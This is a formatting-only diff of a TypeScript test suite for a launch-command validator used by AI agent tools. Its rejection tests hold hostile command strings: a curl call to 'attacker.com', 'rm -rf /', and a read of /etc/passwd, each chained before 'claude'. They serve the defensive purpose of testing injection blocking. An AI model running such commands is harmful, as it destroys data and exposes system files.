@@ -212,16 +212,12 @@ describe("validateLaunchCmd", () => {
 
     it("should accept zeroclaw launch command with cargo env", () => {
       expect(() =>
-        validateLaunchCmd(
-          "source ~/.cargo/env 2>/dev/null; source ~/.spawnrc 2>/dev/null; zeroclaw agent",
-        ),
+        validateLaunchCmd("source ~/.cargo/env 2>/dev/null; source ~/.spawnrc 2>/dev/null; zeroclaw agent"),
       ).not.toThrow();
     });
 
     it("should accept hermes launch command", () => {
-      expect(() =>
-        validateLaunchCmd("source ~/.spawnrc 2>/dev/null; hermes"),
-      ).not.toThrow();
+      expect(() => validateLaunchCmd("source ~/.spawnrc 2>/dev/null; hermes")).not.toThrow();
     });
 
     it("should accept a simple binary with no preamble", () => {
@@ -260,18 +256,12 @@ describe("validateLaunchCmd", () => {
     });
 
     it("should reject arbitrary commands in preamble", () => {
-      expect(() =>
-        validateLaunchCmd("curl attacker.com; claude"),
-      ).toThrow(/Invalid launch command/);
-      expect(() =>
-        validateLaunchCmd("rm -rf /; claude"),
-      ).toThrow(/Invalid launch command/);
+      expect(() => validateLaunchCmd("curl attacker.com; claude")).toThrow(/Invalid launch command/);
+      expect(() => validateLaunchCmd("rm -rf /; claude")).toThrow(/Invalid launch command/);
     });
 
     it("should reject redirection to arbitrary paths in preamble", () => {
-      expect(() =>
-        validateLaunchCmd("cat /etc/passwd > /tmp/out; claude"),
-      ).toThrow(/Invalid launch command/);
+      expect(() => validateLaunchCmd("cat /etc/passwd > /tmp/out; claude")).toThrow(/Invalid launch command/);
     });
 
     it("should reject commands that are too long", () => {
